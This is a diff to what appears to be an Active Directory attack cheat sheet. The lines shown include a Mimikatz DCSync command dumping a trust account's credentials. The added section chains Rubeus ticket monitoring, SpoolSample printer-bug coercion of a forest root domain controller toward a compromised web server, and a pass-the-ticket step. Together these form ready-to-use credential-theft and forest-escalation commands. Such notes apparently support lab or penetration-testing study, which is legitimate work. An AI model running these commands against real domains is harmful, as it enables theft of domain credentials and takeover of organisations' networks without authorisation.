@@ -984,6 +984,15 @@ You can also achieve this "_by querying the FOREIGN_DOMAIN_SHORTNAME$ account_":
 
 ```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```
 * * * 
+#### Unconstrained Printer Forestry
+You can also use exactly the same printer bug trick as before, but making the machine account of the Forest ROOT domain controller to connect to the previously compromised Web Server in the child domain.
+
+```
+Rubeus triage
+Rubeus monitor /interval:5 /filteruser:rdc-01$ /nowrap
+SpoolSample RDC-01.bcorp.lab WebSrv_ownd
+Rubeus ptt /ticket:
+```
 
 #### Across Forests - Inter-Forest Trust
 There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts. Other than that it is the same:
